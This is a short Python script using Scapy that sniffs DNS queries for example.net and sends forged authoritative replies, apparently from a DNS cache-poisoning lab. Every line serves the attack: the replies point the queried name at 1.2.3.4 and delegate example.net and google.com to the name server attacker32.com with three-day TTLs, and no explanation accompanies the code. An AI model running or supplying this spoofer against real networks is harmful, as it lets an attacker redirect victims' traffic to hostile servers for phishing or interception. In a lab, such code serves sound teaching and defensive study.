from scapy.all import *
import argparse

def get_arguments():
        parser = argparse.ArgumentParser()
        parser.add_argument("-f", dest="filter")
        (options) = parser.parse_args()
        return options

def poison_cache(pkt):
        if (pkt.haslayer(DNSQR) and 'example.net' in str(pkt[DNS].qd.qname)):
                cpyPkt = pkt
                cpyPkt.show()
                newIP = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                newUDP = UDP(dport=pkt[UDP].sport, sport = 53)
                # Answer
                ans = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='1.2.3.4')
                # Authority
                auth = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com')
                auth2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='attacker32.com')
                # DNS Packet
                dnsPKT = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, qdcount=1, ancount=1, nscount=2, arcount=0, an=ans, ns=auth/auth2)
                newPKT = newIP/newUDP/dnsPKT
                newPKT.show()
                send(newPKT)

def find_packet(args):
        pkt = sniff(filter=args.filter, prn=poison_cache)

args = get_arguments()
find_packet(args)